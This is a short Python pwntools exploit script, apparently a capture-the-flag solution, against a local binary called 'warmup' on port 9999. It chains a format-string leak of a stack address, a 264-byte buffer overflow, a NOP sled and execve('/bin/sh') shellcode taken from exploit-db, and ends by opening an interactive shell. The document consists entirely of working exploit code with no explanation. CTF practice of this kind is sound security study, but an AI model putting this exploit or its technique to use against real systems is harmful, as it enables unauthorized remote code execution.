from pwn import *
import struct

ADDR_START = 0x400590

# https://www.exploit-db.com/shellcodes/47008
sc = "\x48\x83\xEC\x40" # sub rsp, 64
sc += "\x48\x31\xf6\x56\x48\xbf"
sc += "\x2f\x62\x69\x6e\x2f"
sc += "\x2f\x73\x68\x57\x54"
sc += "\x5f\xb0\x3b\x99\x0f\x05"

r = remote("127.0.0.1", 9999)
#r = process('./warmup')
r.recvuntil(":)\n")

r.send("%41$016lx" + "A"*(264-9) + struct.pack("<Q", ADDR_START) + "\n")

data = r.recvuntil(":)\n")
addr = int(data[0:16], 16) - 0x1e8
print "Buffer is at %016lx" % addr

r.send("\x90"*(264 - len(sc)) + sc + struct.pack("<Q", addr) + "\n")

r.interactive()
